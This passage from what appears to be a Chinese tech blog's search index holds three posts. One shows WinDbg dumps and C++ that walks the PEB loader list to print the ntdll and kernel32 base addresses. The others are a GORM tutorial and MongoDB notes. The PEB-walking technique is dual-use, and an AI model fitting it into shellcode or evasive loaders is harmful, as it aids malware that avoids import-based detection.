&quot;D:\\\\Tencent\\\\WeChat\\\\WeChat.exe&quot; +0x058 BaseDllName : _UNICODE_STRING &quot;WeChat.exe&quot; +0x000 Length : 0x14 +0x002 MaximumLength : 0x16 +0x008 Buffer : 0x00000275`005e41e4 &quot;WeChat.exe&quot; +0x068 FlagGroup : [4] &quot;???&quot;略...0:000&gt; dt -r1 0x00000275`005e4440-0x10 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000275`005e4d00 - 0x00000275`005e4620 ] +0x000 Flink : 0x00000275`005e4d00 _LIST_ENTRY [ 0x00000275`005e5440 - 0x00000275`005e4430 ] +0x008 Blink : 0x00000275`005e4620 _LIST_ENTRY [ 0x00000275`005e4430 - 0x00007ffc`29996450 ] +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000275`005e4d10 - 0x00000275`005e4630 ] +0x000 Flink : 0x00000275`005e4d10 _LIST_ENTRY [ 0x00000275`005e5450 - 0x00000275`005e4440 ] +0x008 Blink : 0x00000275`005e4630 _LIST_ENTRY [ 0x00000275`005e4440 - 0x00007ffc`29996460 ] +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000275`005e5460 - 0x00007ffc`29996470 ] +0x000 Flink : 0x00000275`005e5460 _LIST_ENTRY [ 0x00000275`005e4d20 - 0x00000275`005e4450 ] +0x008 Blink : 0x00007ffc`29996470 _LIST_ENTRY [ 0x00000275`005e4450 - 0x00000275`005e4d20 ] +0x030 DllBase : 0x00007ffc`29810000 Void // &lt;=== 指向ntdll.dll基址 +0x038 EntryPoint : (null) +0x040 SizeOfImage : 0x217000 +0x048 FullDllName : _UNICODE_STRING &quot;C:\\\\WINDOWS\\\\SYSTEM32\\\\ntdll.dll&quot; +0x000 Length : 0x3a +0x002 MaximumLength : 0x3c +0x008 Buffer : 0x00000275`005e42c0 &quot;C:\\\\WINDOWS\\\\SYSTEM32\\\\ntdll.dll&quot; +0x058 BaseDllName : _UNICODE_STRING &quot;ntdll.dll&quot; +0x000 Length : 0x12 +0x002 MaximumLength : 0x14 +0x008 Buffer : 0x00007ffc`2994e5d0 &quot;ntdll.dll&quot; +0x068 FlagGroup : [4] &quot;???&quot;略...0:000&gt; dt -r1 0x00000275`005e4d10-0x10 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000275`005e5440 - 0x00000275`005e4430 ] +0x000 Flink : 0x00000275`005e5440 _LIST_ENTRY [ 0x00000275`005e5080 - 0x00000275`005e4d00 ] +0x008 Blink : 0x00000275`005e4430 _LIST_ENTRY [ 0x00000275`005e4d00 - 0x00000275`005e4620 ] +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000275`005e5450 - 0x00000275`005e4440 ] +0x000 Flink : 0x00000275`005e5450 _LIST_ENTRY [ 0x00000275`005e5090 - 0x00000275`005e4d10 ] +0x008 Blink : 0x00000275`005e4440 _LIST_ENTRY [ 0x00000275`005e4d10 - 0x00000275`005e4630 ] +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00007ffc`29996470 - 0x00000275`005e5460 ] +0x000 Flink : 0x00007ffc`29996470 _LIST_ENTRY [ 0x00000275`005e4450 - 0x00000275`005e4d20 ] +0x008 Blink : 0x00000275`005e5460 _LIST_ENTRY [ 0x00000275`005e4d20 - 0x00000275`005e4450 ] +0x030 DllBase : 0x00007ffc`286f0000 Void // &lt;=== 指向KERNEL32.dll基址 +0x038 EntryPoint : 0x00007ffc`287025e0 Void +0x040 SizeOfImage : 0xc4000 +0x048 FullDllName : _UNICODE_STRING &quot;C:\\\\WINDOWS\\\\System32\\\\KERNEL32.DLL&quot; +0x000 Length : 0x40 +0x002 MaximumLength : 0x42 +0x008 Buffer : 0x00000275`005e4ef0 &quot;C:\\\\WINDOWS\\\\System32\\\\KERNEL32.DLL&quot; +0x058 BaseDllName : _UNICODE_STRING &quot;KERNEL32.DLL&quot; +0x000 Length : 0x18 +0x002 MaximumLength : 0x1a +0x008 Buffer : 0x00000275`005e4f18 &quot;KERNEL32.DLL&quot; +0x068 FlagGroup : [4] &quot;???&quot;略...0:000&gt; dt -r1 0x00000275`005e5450-0x10 _LDR_DATA_TABLE_ENTRYntdll!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000275`005e5080 - 0x00000275`005e4d00 ] +0x000 Flink : 0x00000275`005e5080 _LIST_ENTRY [ 0x00000275`005e8270 - 0x00000275`005e5440 ] +0x008 Blink : 0x00000275`005e4d00 _LIST_ENTRY [ 0x00000275`005e5440 - 0x00000275`005e4430 ] +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000275`005e5090 - 0x00000275`005e4d10 ] +0x000 Flink : 0x00000275`005e5090 _LIST_ENTRY [ 0x00000275`005e8280 - 0x00000275`005e5450 ] +0x008 Blink : 0x00000275`005e4d10 _LIST_ENTRY [ 0x00000275`005e5450 - 0x00000275`005e4440 ] +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000275`005e4d20 - 0x00000275`005e4450 ] +0x000 Flink : 0x00000275`005e4d20 _LIST_ENTRY [ 0x00007ffc`29996470 - 0x00000275`005e5460 ] +0x008 Blink : 0x00000275`005e4450 _LIST_ENTRY [ 0x00000275`005e5460 - 0x00007ffc`29996470 ] +0x030 DllBase : 0x00007ffc`270e0000 Void // &lt;=== 指向KERNELBASE.dll基址 +0x038 EntryPoint : 0x00007ffc`27121850 Void +0x040 SizeOfImage : 0x3ac000 +0x048 FullDllName : _UNICODE_STRING &quot;C:\\\\WINDOWS\\\\System32\\\\KERNELBASE.dll&quot; +0x000 Length : 0x44 +0x002 MaximumLength : 0x46 +0x008 Buffer : 0x00000275`005e5630 &quot;C:\\\\WINDOWS\\\\System32\\\\KERNELBASE.dll&quot; +0x058 BaseDllName : _UNICODE_STRING &quot;KERNELBASE.dll&quot; +0x000 Length : 0x1c +0x002 MaximumLength : 0x1e +0x008 Buffer : 0x00000275`005e5658 &quot;KERNELBASE.dll&quot; +0x068 FlagGroup : [4] &quot;???&quot;略... 代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;winternl.h&gt;#include &lt;intrin.h&gt;#pragma comment(lib, &quot;ntdll.lib&quot;)int main() &#123; // 获取 PEB 地址 PVOID pPeb = reinterpret_cast&lt;PVOID&gt;(__readgsqword(0x60)); if (!pPeb) &#123; std::cerr &lt;&lt; &quot;Failed to get PEB address.&quot; &lt;&lt; std::endl; return 1; &#125; // 计算 Ldr 地址的偏移量 ULONG64 ldrOffset = 0x18; // PEB 结构中 Ldr 成员的偏移量 // 计算 Ldr 地址 PVOID pLdr = *reinterpret_cast&lt;PVOID*&gt;(reinterpret_cast&lt;PBYTE&gt;(pPeb) + ldrOffset); if (!pLdr) &#123; std::cerr &lt;&lt; &quot;Failed to get Ldr address.&quot; &lt;&lt; std::endl; return 1; &#125; // 计算 InLoadOrderModuleList 地址的偏移量 ULONG64 moduleListOffset = offsetof(PEB_LDR_DATA, InMemoryOrderModuleList); // 计算 InLoadOrderModuleList 地址 PLIST_ENTRY pModuleList = reinterpret_cast&lt;PLIST_ENTRY&gt;(reinterpret_cast&lt;PBYTE&gt;(pLdr) + moduleListOffset); // 获取第一个模块的地址，通常是 ntdll.dll PLIST_ENTRY pFirstEntry = pModuleList-&gt;Flink; PLDR_DATA_TABLE_ENTRY pDataTableEntry = CONTAINING_RECORD(pFirstEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); PVOID pModExeBase = pDataTableEntry-&gt;DllBase; UNICODE_STRING pModExeName = pDataTableEntry-&gt;FullDllName; // 将 UNICODE_STRING 转换为 std::wstring std::wstring ModExeModuleNameW(pModExeName.Buffer, pModExeName.Length / sizeof(WCHAR)); // 输出模块信息 std::wcout &lt;&lt; L&quot;Module: &quot; &lt;&lt; ModExeModuleNameW &lt;&lt; L&quot;, Base Address: &quot; &lt;&lt; pModExeBase &lt;&lt; std::endl; PLDR_DATA_TABLE_ENTRY pKernel32Entry = nullptr; // 计算第二个模块的地址，通常是 ntdll.dll PLIST_ENTRY pSecondEntry = pFirstEntry-&gt;Flink; PLDR_DATA_TABLE_ENTRY pSecondDataTableEntry = CONTAINING_RECORD(pSecondEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); PVOID pNtDllBase = pSecondDataTableEntry-&gt;DllBase; UNICODE_STRING NtDllName = pSecondDataTableEntry-&gt;FullDllName; // 将 UNICODE_STRING 转换为 std::wstring std::wstring NtDllModuleNameW(NtDllName.Buffer, NtDllName.Length / sizeof(WCHAR)); // 输出模块信息 std::wcout &lt;&lt; L&quot;Module: &quot; &lt;&lt; NtDllModuleNameW &lt;&lt; L&quot;, Base Address: &quot; &lt;&lt; pNtDllBase &lt;&lt; std::endl; // 计算第三个模块的地址，通常是 KERNEL32.dll PLIST_ENTRY pThirdEntry = pSecondEntry-&gt;Flink; PLDR_DATA_TABLE_ENTRY pThirdDataTableEntry = CONTAINING_RECORD(pThirdEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks); PVOID pKernel32Base = pThirdDataTableEntry-&gt;DllBase; UNICODE_STRING Kernel32Name = pThirdDataTableEntry-&gt;FullDllName; // 将 UNICODE_STRING 转换为 std::wstring std::wstring Kernel32ModuleNameW(Kernel32Name.Buffer, Kernel32Name.Length / sizeof(WCHAR)); // 输出模块信息 std::wcout &lt;&lt; L&quot;Module: &quot; &lt;&lt; Kernel32ModuleNameW &lt;&lt; L&quot;, Base Address: &quot; &lt;&lt; pKernel32Base &lt;&lt; std::endl; return 0;&#125;","categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"}]},{"title":"Gorm学习手册","slug":"Gorm","date":"2024-06-14T01:07:01.000Z","updated":"2024-06-17T08:08:59.155Z","comments":true,"path":"ac48c083.html","link":"","permalink":"http://example.com/ac48c083.html","excerpt":"记录Gorm学习手册","text":"记录Gorm学习手册 声明模型模型定义 GORM通过将Go结构体(Go Structs)映射到数据库表来简化数据库交互 模型定义模型是使用普通结构体定义的。这些结构体可以包含具有基本Go类型、指针或这些类型的别名, 甚至是自定义类型(只需要实现database/sql包中的Scanner和Valuer接口)。 考虑以下user模型示例: 1234567891011type User struct &#123; ID uint // 主键 Name string // 一个常规字符串字段 Email *string // 一个指向字符串的指针, 允许空值 Age uint8 // 一个未签名的8位整数 Brithday *time.Time // time.Time指针, 可以为空 MemberNumber sql.NullString // 使用 sql.NullString 处理可为空字符串 ActivatedAt sql.NullTime // Uses sql.NullTime for nullable time fields CreatedAt time.Time // 创建时间（由GORM自动管理） UpdatedAt time.Time // 最后一次更新时间（由GORM自动管理）&#125; 在此模型中: 具体数字型如uint、string和uint8直接使用; 指向*string和*time.Time类型的指针表示可空字段; 来自database/sql包的sql.NullString和sql.NullTime用于具有更多控制的可空字段; CreateAt和UpdateAt是特殊字段, 当记录被创建或更新时, GORM会自动向内填充当前时间; 除了GORM中模型声明的基本特性外, 强调下通过serializer标签支持序列化也很重要; 此功能增强了数据存储和检索的灵活性, 特别是需要自定义序列化逻辑的字段; 约定 主键: GORM使用一个名为ID的字段作为每个模型的默认主键; 表名: 默认情况下, GORM将结构体名称转化为snake_case并为表名加上复数形式; 例如, 一个User结构体在数据库中表名变成users; 列名: GORM自动将结构体字段名转换为snake_case作为数据库中列名; 时间戳字段: GORM使用字段CreatedAt和UpdatedAt来自动跟踪记录的创建和更新时间; gorm.ModelGORM提供了一个预定义的结构体, 名为gorm.Model, 其中包含常用字段: 1234567// gorm.Model 的定义type Model struct &#123; ID uint `gorm:&quot;primaryKey&quot;` CreatedAt time.Time UpdatedAt time.Time DeletedAt gorm.DeletedAt `gorm:&quot;index&quot;`&#125; 将其嵌入在结构体中: 可以直接在结构体中嵌入gorm.Model, 以便自动包含这些字段; 包含的字段: ID: 每个记录的唯一标识符(主键); CreatedAt: 在创建时自动设置为当前时间; UpdatedAt: 每当记录更新时, 自动更新为当前时间; DeletedAt: 用于软删除; CRUD接口创建创建记录1234567user := User&#123;Name: &quot;Jinzhu&quot;, Age: 18, Birthday: time.Now()&#125;result := db.Create(&amp;user) // 通过数据的指针来创建user.ID // 返回插入数据的主键result.Error // 返回errorresult.RowsAffected // 返回插入记录的条数 我们还可以使用Create()创建多项记录: 123456789users := []*User&#123; &#123;Name: &quot;Jinzhu&quot;, Age: 18, Birthday: time.Now()&#125;, &#123;Name: &quot;Jackson&quot;, Age: 19, Birthday: time.Now()&#125;,&#125;result := db.Create(&amp;users)result.Error // 返回错误result.RowsAffected // 返回插入记录的条数 无法向create传递结构体, 所以应该传入数据的指针 用指定的字段创建记录创建记录并为指定字段赋值 12db.Select(&quot;Name&quot;, &quot;Age&quot;, &quot;CreateAt&quot;).Create(&amp;user)// INSERT INTO `users` (`name`, `age`, `create_at`) VALUES (&quot;Jinzhu&quot;, 18, &quot;2024-07-04 11:05:21.775&quot;) 创建记录并忽略传递给Omit的字段值 12db.Omit(&quot;Name&quot;, &quot;Age&quot;, &quot;CreateAt&quot;).Create(&amp;user)// INSERT INTO `users` (`birthday`, `updated_at`) VALUES (&quot;2024-01-01 00:00:00.000&quot;, &quot;2024-07-04 11:05:21.775&quot;) 批量插入要高效地插入大量记录, 请将切片传递给Create方法。GORM将生成一条SQL来插入所有数据, 以返回所有主键值, 并触发Hook方法, 当这些记录可以被分割成多个批次时, GORM会开启一个事务来处理它们。 12345678910var users = []User&#123; &#123;Name: &quot;jinzhu1&quot;&#125;, &#123;Name: &quot;jinzhu2&quot;&#125;, &#123;Name: &quot;jinzhu3&quot;&#125;,&#125;db.Create(&amp;users)for _, user := range users &#123; user.ID // 1,2,3&#125; 可以通过db.CreateInBatches方法来指定批量插入的批次大小 12345678var users []User&#123; &#123;Name: &quot;jinzhi1&quot;&#125;, ... &#123;Name&#125;: &quot;jinzhi1000&quot;,&#125;// 插入批次大小为100db.CreateInBatches(&amp;users, 100) 注意: 使用CreateBatchSize选项初始化GORM实例后, 此后进行创建&amp;关联操作时所有的INSERT行为都会遵循初始化的配置。 12345678910111213db, err := gorm.Open(sqlite.Open(&quot;gorm.db&quot;), &amp;gorm.Config&#123; CreateBatchSize: 1000,&#125;)if err != nil &#123;...&#125;db := db.Session(&amp;gorm.Session&#123;CreateBatchSize: 1000&#125;)users := [5000]User&#123;&#123;Name: &quot;jinzhu&quot;, Pets: []Pet&#123;pet1, pet2, pet3&#125;&#125;&#125;db.Create(&amp;users)// INSERT INTO users xxx (5 batches)// INSERT INTO pets xxx (15 batches) 创建钩子GORM允许用户通过实现这些接口BeforeSave、BeforeCreate、AfterSave、AfterCreate来自定义钩子。这些钩子方法会在创建一条记录时被调用; 12345678func (u *User) BeforeCreate (tx *gorm.DB) (err error) &#123; u.UUID = uuid.New() if u.Role == &quot;admin&quot; &#123; return errors.New(&quot;invalid code&quot;) &#125; return&#125; 如果想跳过Hooks方法, 可以使用SkipHooks会话模式, 例子如下: 123DB.Session(&amp;gorm.Session&#123;SkipHooks: true&#125;).Create(&amp;user)DB.Session(&amp;gorm.Session&#123;SkipHooks: true&#125;).Create(&amp;users)DB.Session(&amp;gorm.Session&#123;SkipHooks: true&#125;).CreateInBatches(&amp;user, 100) 根据 Map 创建GORM支持通过map[string]interface&#123;&#125;与[]map[string]interface&#123;&#125;&#123;&#125;来创建记录。 123456789db.Model(&amp;User&#123;&#125;).Create(map[string]interface&#123; &#123; &quot;Name&quot;: &quot;jinzhu&quot;, &quot;Age&quot;: 18 &#125;,&#125;)// batch insert from `[]map[string]interface&#123;&#125;&#123;&#125;`db.Model(&amp;User).Create([]map[string]interface&#123;&#125;&#123; &#123; &quot;Name&quot;: &quot;jinzhu_1&quot;, &quot;Age&quot;: 18 &#125;, &#123; &quot;Name&quot;: &quot;jinzhu_2&quot;, &quot;Age&quot;: 20 &#125;,&#125;) 注意: 当使用map来创建时, 钩子方法不会执行, 关联不会被保存且不会回写主键。","categories":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://example.com/tags/Golang/"}]},{"title":"MongoDB速记","slug":"MongoDB","date":"2024-06-11T14:37:56.000Z","updated":"2024-06-17T07:01:03.862Z","comments":true,"path":"8ead567e.html","link":"","permalink":"http://example.com/8ead567e.html","excerpt":"记录MongoDB相关命令","text":"记录MongoDB相关命令 MongoDB 排序升序 查询one集合中的数据并根据age字段进行升序排序 123456789// 查询one集合中的数据并根据age字段进行升序排序Martin&gt; db.one.find().sort(&#123;&quot;age&quot;: 1&#125;)[ &#123; _id: ObjectId(&#x27;666862463ebdc4e4a4cdcdf6&#x27;), name: &#x27;li&#x27; &#125;, &#123; _id: ObjectId(&#x27;666862763ebdc4e4a4cdcdf7&#x27;), name: &#x27;zeng&#x27;, age: 16 &#125;, &#123; _id: ObjectId(&#x27;6668627f3ebdc4e4a4cdcdf8&#x27;), name: &#x27;wang&#x27;, age: 20 &#125;, &#123; _id: ObjectId(&#x27;6668628a3ebdc4e4a4cdcdf9&#x27;), name: &#x27;zhang&#x27;, age: 24 &#125;, &#123; _id: ObjectId(&#x27;666862943ebdc4e4a4cdcdfa&#x27;), name: &#x27;li&#x27;, age: 28 &#125;] 查询one集合中age大于20并根据age进行升序排序 123456// 查询one集合中age大于20并根据age进行升序排序Martin&gt; db.one.find(&#123;age: &#123;$gt: 20&#125;&#125;).sort(&#123;&quot;age&quot;: 1&#125;)[ &#123; _id: ObjectId(&#x27;6668628a3ebdc4e4a4cdcdf9&#x27;), name: &#x27;zhang&#x27;, age: 24 &#125;, &#123; _id: ObjectId(&#x27;666862943ebdc4e4a4cdcdfa&#x27;), name: &#x27;li&#x27;, age: 28 &#125;] 降序 查询one集合中的数据并根据age字段进行降序排序 123456789// 查询one集合中的数据并根据age字段进行降序排序Martin&gt; db.one.find().sort(&#123;&quot;age&quot;: -1&#125;)[ &#123; _id: ObjectId(&#x27;666862943ebdc4e4a4cdcdfa&#x27;), name: &#x27;li&#x27;, age: 28 &#125;, &#123; _id: ObjectId(&#x27;6668628a3ebdc4e4a4cdcdf9&#x27;), name: &#x27;zhang&#x27;, age: 24 &#125;, &#123; _id: ObjectId(&#x27;6668627f3ebdc4e4a4cdcdf8&#x27;), name: &#x27;wang&#x27;, age: 20 &#125;, &#123; _id: ObjectId(&#x27;666862763ebdc4e4a4cdcdf7&#x27;), name: &#x27;zeng&#x27;, age: 16 &#125;, &#123; _id: ObjectId(&#x27;666862463ebdc4e4a4cdcdf6&#x27;), name: &#x27;li&#x27; &#125;] 查询one集合中age大于20并根据age进行降序排序 123456// 查询one集合中age大于20并根据age进行降序排序Martin&gt; db.one.find(&#123;age: &#123;$gt: 20&#125;&#125;).sort(&#123;&quot;age&quot;: -1&#125;)[ &#123; _id: ObjectId(&#x27;666862943ebdc4e4a4cdcdfa&#x27;), name: &#x27;li&#x27;, age: 28 &#125;, &#123; _id: ObjectId(&#x27;6668628a3ebdc4e4a4cdcdf9&#x27;), name: &#x27;zhang&#x27;, age: 24 &#125;] 求和求集合的文档总数 查询one集合中的文档总数 123// 查询one集合中的文档总数Martin&gt; db.one.countDocuments()5 查询one集合中age大于20的文档数量 123// 查询one集合中age大于20的文档数量Martin&gt; db.one.find(&#123;age: &#123;$gt: 20&#125;&#125;).count()2 某个字段求和 导入测试数据 123456789101112131415161718192021222324252627282930313233343536373839// 导入测试数据Martin&gt; db.three.insertMany([&#123;name: &quot;li&quot;, class: 1, score: 89&#125;, &#123;name: &quot;zhang&quot;, class: 1, score: 92&#125;, &#123;name: &quot;li&quot;, class: 2, score: 94&#125;, &#123;name: &quot;liu&quot;, class: 2, score: 88&#125;])&#123; acknowledged: true, insertedIds: &#123; &#x27;0&#x27;: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfb&#x27;), &#x27;1&#x27;: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfc&#x27;), &#x27;2&#x27;: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfd&#x27;), &#x27;3&#x27;: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfe&#x27;) &#125;&#125;// 查询three集合中所有数据Martin&gt; db.three.find()[ &#123; _id: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfb&#x27;), name: &#x27;li&#x27;, class: 1, score: 89 &#125;, &#123; _id: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfc&#x27;), name: &#x27;zhang&#x27;, class: 1, score: 92 &#125;, &#123; _id: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfd&#x27;), name: &#x27;li&#x27;, class: 2, score: 94 &#125;, &#123; _id: ObjectId(&#x27;666866c33ebdc4e4a4cdcdfe&#x27;), name: &#x27;liu&#x27;, class: 2, score: 88 &#125;] 对不同class进行score求和12345Martin&gt; db.three.aggregate([&#123;&#x27;$group&#x27;: &#123;&#x27;_id&#x27;: &#x27;$class&#x27;, &#x27;sum_score&#x27;: &#123;&#x27;$sum&#x27;: &#x27;$score&#x27;&#125;&#125;&#125;])[ &#123; _id: 1, sum_score: 181 &#125;, &#123; _id: 2, sum_score: 182 &#125;] 平均aggregate()用法解释示例: db.collection_name.aggregate([{&#39;$group&#39;: {&#39;_id&#39;: &#39;$group_filed&#39;, &#39;avg_xxx&#39;: {&#39;$avg&#39;: &#39;$avg_filed&#39;}}}])$group: 分组;_id: 分组后的标识;$group_filed: 分组的字段;avg_xxx: 聚合之后的字段名;$avg: 表示求平均值, $sum表示求和, $max: 表示求最大值, $min: 表示求最小值;$avg_filed: 要聚合的字段; 求平均值 123456// 根据班级求各班的平均值Martin&gt; db.three.aggregate([&#123;&#x27;$group&#x27;: &#123;&#x27;_id&#x27;: &#x27;$class&#x27;, avg_score: &#123;&#x27;$avg&#x27;: &#x27;$score&#x27;&#125;&#125;&#125;])[ &#123; _id: 2, avg_score: 91 &#125;, &#123; _id: 1, avg_score: 90.5 &#125; ] 求分组最大值 123456// 求分组最大值Martin&gt; db.three.aggregate([&#123;&#x27;$group&#x27;: &#123;_id: &#x27;$class&#x27;, &#x27;max_score&#x27;: &#123;&#x27;$max&#x27;: &#x27;$score&#x27;&#125;&#125;&#125;])[ &#123; _id: 1, max_score: 92 &#125;, &#123; _id: 2, max_score: 94 &#125;] 求分组最小值 123456// 求分组最小值Martin&gt; db.three.aggregate([&#123;&#x27;$group&#x27;: &#123;_id: &#x27;$class&#x27;, &#x27;min_score&#x27;: &#123;&#x27;$min&#x27;: &#x27;$score&#x27;&#125;&#125;&#125;])[ &#123; _id: 1, min_score: 89 &#125;, &#123; _id: 2, min_score: 88 &#125; ] 索引 提高检索的速度 单键索引 添加测试数据 12345678910111213141516171819202122232425262728293031// 使用for循环添加数据Martin&gt; for (var i=1; i&lt;=10000; i++) db.four.insert(&#123;num: i, name: &#x27;a&#x27;&#125;)DeprecationWarning: Collection.insert() is deprecated. Use insertOne, insertMany, or bulkWrite.&#123; acknowledged: true, insertedIds: &#123; &#x27;0&#x27;: ObjectId(&#x27;666d8638f6e0bc9a3ecdf505&#x27;) &#125;&#125;Martin&gt; db.four.find()[ &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdf6&#x27;), num: 1, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdf7&#x27;), num: 2, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdf8&#x27;), num: 3, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdf9&#x27;), num: 4, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdfa&#x27;), num: 5, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdfb&#x27;), num: 6, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdfc&#x27;), num: 7, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdfd&#x27;), num: 8, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdfe&#x27;), num: 9, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdcdff&#x27;), num: 10, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce00&#x27;), num: 11, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce01&#x27;), num: 12, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce02&#x27;), num: 13, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce03&#x27;), num: 14, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce04&#x27;), num: 15, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce05&#x27;), num: 16, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce06&#x27;), num: 17, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce07&#x27;), num: 18, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce08&#x27;), num: 19, name: &#x27;a&#x27; &#125;, &#123; _id: ObjectId(&#x27;666d862af6e0bc9a3ecdce09&#x27;), num: 20, name: &#x27;a&#x27; &#125;]Type &quot;it&quot; for more 创建索引 123// 创建索引, 1为升序索引, -1为降序索引Martin&gt; db.four.createIndex(&#123;&quot;num&quot;: 1&#125;)num_1 查询索引 123456// 查询索引Martin&gt; db.four.getIndexes()[ &#123; v: 2, key: &#123; _id: 1 &#125;, name: &#x27;_id_&#x27; &#125;, &#123; v: 2, key: &#123; num: 1 &#125;, name: &#x27;num_1&#x27; &#125;] 删除索引 12345// 删除索引Martin&gt; db.four.dropIndex(&quot;num_1&quot;)&#123; nIndexesWas: 2, ok: 1 &#125;Martin&gt; db.four.getIndexes()[ &#123; v: 2, key: &#123; _id: 1 &#125;, name: &#x27;_id_&#x27; &#125; ] 组合索引12345678// 创建组合索引Martin&gt; db.four.createIndex(&#123;&quot;num&quot;: 1, &quot;name&quot;: 1&#125;)num_1_name_1Martin&gt; db.four.getIndexes()[ &#123; v: 2, key: &#123; _id: 1 &#125;, name: &#x27;_id_&#x27; &#125;, &#123; v: 2, key: &#123; num: 1, name: 1 &#125;, name: &#x27;num_1_name_1&#x27; &#125;] 多值索引（组合索引）123456789101112131415161718// 写入测试数据Martin&gt; db.five.insert(&#123;name: &quot;martin&quot;, tag: [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]&#125;)&#123; acknowledged: true, insertedIds: &#123; &#x27;0&#x27;: ObjectId(&#x27;666d8a8ef6e0bc9a3ecdf506&#x27;) &#125;&#125;// 创建多值索引Martin&gt; db.five.createIndex(&#123;tag: 1&#125;)tag_1// 查询数据Martin&gt; db.five.find(&#123;tag: &quot;b&quot;&#125;)[ &#123; _id: ObjectId(&#x27;666d8a8ef6e0bc9a3ecdf506&#x27;), name: &#x27;martin&#x27;, tag: [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27; ] &#125;] 全文索引123456789101112131415161718// 创建全文索引（name字段）, 一个集合最多创建一个全文索引Martin&gt; db.five.createIndex(&#123;&quot;name&quot;: &quot;text&quot;&#125;)name_text// 获取索引Martin&gt; db.five.getIndexes()[ &#123; v: 2, key: &#123; _id: 1 &#125;, name: &#x27;_id_&#x27; &#125;, &#123; v: 2, key: &#123; tag: 1 &#125;, name: &#x27;tag_1&#x27; &#125;, &#123; v: 2, key: &#123; _fts: &#x27;text&#x27;, _ftsx: 1 &#125;, name: &#x27;name_text&#x27;, weights: &#123; name: 1 &#125;, default_language: &#x27;english&#x27;, language_override: &#x27;language&#x27;, textIndexVersion: 3 &#125;] 哈希索引123456789101112131415161718// 创建哈希索引, 哈希索引不支持范围索引并且不支持多键哈希Martin&gt; db.five.createIndex(&#123;name: &quot;hashed&quot;&#125;)name_hashedMartin&gt; db.five.getIndexes()[ &#123; v: 2, key: &#123; _id: 1 &#125;, name: &#x27;_id_&#x27; &#125;, &#123; v: 2, key: &#123; tag: 1 &#125;, name: &#x27;tag_1&#x27; &#125;, &#123; v: 2, key: &#123; _fts: &#x27;text&#x27;, _ftsx: 1 &#125;, name: &#x27;name_text&#x27;, weights: &#123; name: 1 &#125;, default_language: &#x27;english&#x27;, language_override: &#x27;language&#x27;, textIndexVersion: 3 &#125;, &#123; v: 2, key: &#123; name: &#x27;hashed&#x27; &#125;, name: &#x27;name_hashed&#x27; &#125;] 地理位置索引12345678910111213141516// 添加测试数据Martin&gt; db.six.insertMany([&#123;loc: [9, 9]&#125;, &#123;loc: [11, 11]&#125;, &#123;loc: [100, 100]&#125;])&#123; acknowledged: true, insertedIds: &#123; &#x27;0&#x27;: ObjectId(&#x27;666d8d75f6e0bc9a3ecdf507&#x27;), &#x27;1&#x27;: ObjectId(&#x27;666d8d75f6e0bc9a3ecdf508&#x27;), &#x27;2&#x27;: ObjectId(&#x27;666d8d75f6e0bc9a3ecdf509&#x27;) &#125;&#125;// 创建地理位置索引Martin&gt; 